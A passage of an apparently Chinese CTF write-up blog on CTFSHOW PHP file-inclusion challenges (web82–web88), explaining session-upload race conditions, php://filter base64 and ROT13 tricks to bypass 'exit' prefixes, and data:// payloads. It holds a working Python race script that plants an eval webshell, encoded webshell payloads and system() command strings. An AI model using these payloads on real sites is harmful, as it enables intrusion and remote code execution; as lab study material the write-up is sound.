+<p><img src="../images/20250323105711257.png" alt="image-20250323105711257" /></p>
+<p>然后再按以上步骤重复一次去查看flag文件内容就行了</p>
+<p>总结：</p>
+<p>我们在 Cookie 里设置了 <strong>PHPSESSID=test</strong>，PHP 将会在服务器上创建一个文件：<strong>/tmp/sess_test</strong>，但是对于默认配置 session.upload_progress.cleanup = on，文件上传后 session 文件内容会立即被清空，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session 文件内容前，成功访问包含到该文件，实现恶意代码的命令执行。</p>
+<h4 id="py脚本"><a class="markdownIt-Anchor" href="#py脚本"></a> py脚本</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// 通过 SESSION 条件竞争 写入 SHELL</span><br><span class="line">//requests：用于发送HTTP请求。</span><br><span class="line">//BytesIO：用于在内存中创建一个二进制流，模拟文件上传。</span><br><span class="line">//Thread：用于创建多线程，实现条件竞争。</span><br><span class="line">//urljoin：用于拼接URL。</span><br><span class="line"></span><br><span class="line">from requests import get, post</span><br><span class="line">from io import BytesIO</span><br><span class="line">from threading import Thread</span><br><span class="line">from urllib.parse import urljoin</span><br><span class="line"></span><br><span class="line">URL = &#x27;https://03042687-bc97-470d-bfa0-749ee316f124.challenge.ctf.show/&#x27;</span><br><span class="line">PHPSESSID = &#x27;shell&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">    code = &quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;, &#x27;&lt;?php @eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;</span><br><span class="line">    data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: code&#125;</span><br><span class="line">    cookies = &#123;&#x27;PHPSESSID&#x27;: PHPSESSID&#125;</span><br><span class="line">        files = &#123;&#x27;file&#x27;: (&#x27;xxx.txt&#x27;, BytesIO(b&#x27;x&#x27; * 10240))&#125; 	#files：模拟文件上传，上传一个名为 xxx.txt 的																	文件，内容为10240字节的 x。</span><br><span class="line">    while True:</span><br><span class="line">        post(URL, data, cookies=cookies, files=files)   #while True：无限循环，持续发送POST请求，尝试将PHP代码														写入会话文件。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">    params = &#123;&#x27;file&#x27;: f&#x27;/tmp/sess_&#123;PHPSESSID&#125;&#x27;&#125;</span><br><span class="line">    while True:</span><br><span class="line">        get(URL, params)</span><br><span class="line">        url = urljoin(URL, &#x27;shell.php&#x27;)</span><br><span class="line">        code = get(url).status_code.real</span><br><span class="line">        print(f&#x27;&#123;url&#125; &#123;code&#125;&#x27;)</span><br><span class="line">        if code == 200:</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    Thread(target=write, daemon=True).start()#创建一个守护线程（daemon=True），执行 write() 函数，持续发送POST												请求，尝试写入PHP代码。</span><br><span class="line">    read()</span><br></pre></td></tr></table></figure>
+<h2 id="web83-86同82"><a class="markdownIt-Anchor" href="#web83-86同82"></a> web83-86(同82)</h2>
+<p>依旧是session条件竞争</p>
+<h2 id="web87phpfilter的妙用"><a class="markdownIt-Anchor" href="#web87phpfilter的妙用"></a> web87(php://filter的妙用)</h2>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌</a></p>
+<h3 id="巧用编码与解码"><a class="markdownIt-Anchor" href="#巧用编码与解码"></a> 巧用编码与解码</h3>
+<h4 id="举例"><a class="markdownIt-Anchor" href="#举例"></a> 举例</h4>
+<p>常见类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure>
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了</p>
+<p>这里的<code>$_POST['filename']</code>是可以控制协议的</p>
+<p><strong>重点：<strong>使用php://filter流的</strong>base64-decode</strong>方法，将<code>$content</code>解码，利用<strong>php base64_decode</strong>函数特性去除“死亡exit”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</span><br><span class="line">所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</span><br><span class="line">&lt;?php</span><br><span class="line">$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);</span><br><span class="line">base64_decode($_GET[&#x27;txt&#x27;]);</span><br><span class="line"></span><br><span class="line">所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</span><br><span class="line">“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，&quot;phpexita&quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</span><br></pre></td></tr></table></figure>
+<p>自己总结：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(php://filter/write=convert.base64-decode/resource=shell.php,$content)是将$content的base64内容解码后写入shell.php中</span><br><span class="line">而$content的头部已经有&lt;?php exit();?&gt;了，但假设我们现在先不给content传值，于是$content=&lt;?php exit();?&gt;</span><br><span class="line">绕过exit的重点就是:base64只能解码[0-9a-zA-Z]，无法解码其他字符</span><br><span class="line">而base64又是以4个字符为一个解码单位，而content能解码的字符只有phpexit这里7个</span><br><span class="line">所以我们还需给它加一个可解码字符</span><br><span class="line">所以file_put_contents(php://filter/write=convert.base64-decode/resource=shell.php,&lt;?php exit();?&gt;a)</span><br><span class="line">-&gt;phpexita被base64解码后写入shell.php中，至于解码成了什么，不关我们的事了</span><br><span class="line">这样exit就没了，就能写入我们的一句话了</span><br><span class="line">$content=&lt;?php exit();?&gt;aPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==  //(后面这串就是&lt;?php @eval($_POST[a]);?&gt;)</span><br><span class="line">经过file_put_contents就是</span><br><span class="line"></span><br><span class="line">shell.php:</span><br><span class="line">**&lt;?php @eval($_POST[a]);?&gt;</span><br><span class="line">然后直接访问shell.php用蚁剑连就行了</span><br></pre></td></tr></table></figure>
+<h4 id="本题"><a class="markdownIt-Anchor" href="#本题"></a> 本题</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本质是一样的</p>
+<p>这里可解码字符是phpdie一共6个，还需加2个</p>
+<p>原型:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">$content=&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;aa&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>因为有给urldecode，所以我们需要将$file先转化为acii后再两次url编码</p>
+<p>为什么要两次：因为第一次编码过去之后自动解码（中间件自动解码），但是他这里还要解码一次，因为写函数了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br><span class="line">$content=aaPD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p>然后访问1.php</p>
+<p>get传参cmd=ls</p>
+<p>cmd=tac fl0g.php执行命令即可</p>
+<h4 id="rot13编码"><a class="markdownIt-Anchor" href="#rot13编码"></a> Rot13编码</h4>
+<p>注意不一定非要用base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=5.php string.rot13 ：应用 ROT13 编码（字符替换算法）。</span><br><span class="line">（两次加密就会把原文弄出来） </span><br><span class="line">file_put_contents函数把一个字符串写入文件中。例如file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);把run写入txt file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</span><br></pre></td></tr></table></figure>
+<p>题解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=shell.php</span><br><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content=&lt;?php @eval($_GET[1]);?&gt;</span><br><span class="line">// ROT13编码</span><br><span class="line">content=&lt;?cuc @riny($_TRG[1]);?&gt;</span><br><span class="line"></span><br><span class="line">flag:</span><br><span class="line">/shell.php?1=system(&quot;tac fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+<h2 id="web88过滤符号"><a class="markdownIt-Anchor" href="#web88过滤符号"></a> web88(过滤符号)</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题看着难，但仔细一看，这些符号过滤了和没过滤一样</p>
+<h3 id="data伪协议base64编码"><a class="markdownIt-Anchor" href="#data伪协议base64编码"></a> data伪协议+base64编码</h3>
+<p>原本<code>&lt;?php system('tac fl0g.php'); ?&gt;</code>base64编码后的结果是<code>PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4==</code></p>
+<p>但=被过滤了，但其实=不加也能别正确编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4======&lt;?php system(&#x27;tac fl0g.php&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2020 青龙组]AreUSerialz" class="lazyload">
+        
+        <a href="/2025/03/22/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [网鼎杯 2020 青龙组]AreUSerialz
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[GXYCTF2019]BabySQli" class="lazyload">
+      
+      <a href="/2025/03/16/%5BGXYCTF2019%5DBabySQli/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [GXYCTF2019]BabySQli
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        91.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        06:19
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.</span> <span class="toc-text"> web78(无过滤)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79%E8%BF%87%E6%BB%A4php"><span class="toc-number">2.</span> <span class="toc-text"> web79(过滤php)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text"> data伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text"> input伪协议+大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text"> 远程加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80%E8%BF%87%E6%BB%A4phpdata"><span class="toc-number">3.</span> <span class="toc-text"> web80(过滤php,data)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#input%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87-2"><span class="toc-number">3.1.</span> <span class="toc-text"> input伪协议+大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD-2"><span class="toc-number">3.2.</span> <span class="toc-text"> 远程加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">3.3.</span> <span class="toc-text"> 日志包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81%E8%BF%87%E6%BB%A4phpdata"><span class="toc-number">4.</span> <span class="toc-text"> web81(过滤php,data,:)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB-2"><span class="toc-number">4.1.</span> <span class="toc-text"> 日志包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82%E8%BF%87%E6%BB%A4phpdata"><span class="toc-number">5.</span> <span class="toc-text"> web82(过滤php,data,:,.)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">5.1.</span> <span class="toc-text"> session文件+条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bp%E7%88%86%E7%A0%B4"><span class="toc-number">5.1.1.</span> <span class="toc-text"> bp爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%8E%AF%E5%A2%83"><span class="toc-number">5.1.1.1.</span> <span class="toc-text"> 构造文件上传环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#intruder"><span class="toc-number">5.1.1.2.</span> <span class="toc-text"> intruder</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#py%E8%84%9A%E6%9C%AC"><span class="toc-number">5.1.2.</span> <span class="toc-text"> py脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web83-86%E5%90%8C82"><span class="toc-number">6.</span> <span class="toc-text"> web83-86(同82)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87phpfilter%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text"> web87(php:&#x2F;&#x2F;filter的妙用)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A7%E7%94%A8%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text"> 巧用编码与解码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">7.1.1.</span> <span class="toc-text"> 举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 本题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81"><span class="toc-number">7.1.3.</span> <span class="toc-text"> Rot13编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88%E8%BF%87%E6%BB%A4%E7%AC%A6%E5%8F%B7"><span class="toc-number">8.</span> <span class="toc-text"> web88(过滤符号)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AEbase64%E7%BC%96%E7%A0%81"><span class="toc-number">8.1.</span> <span class="toc-text"> data伪协议+base64编码</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">62</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">35</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "CTFSHOW-文件包含",
+          url: "http://example.com/2025/03/21/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
+          excerpt: "",
+          description: "",
+          stripContent: "说明： 前几题举图示例 后面由于感官问题就不列图了  web78(无过滤) 123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $file = $_GET[&amp;#x27;file&amp;#x27;];    include($file);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;  我们先用data伪协议来查看flag在哪个文件中 1?file=data://text/plain,&amp;lt;?php",
+          date: "Fri Mar 21 2025 20:58:48 GMT+0800",
+          updated: "Sun Mar 23 2025 15:00:30 GMT+0800",
+          cover: "/../images/17373827994914.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
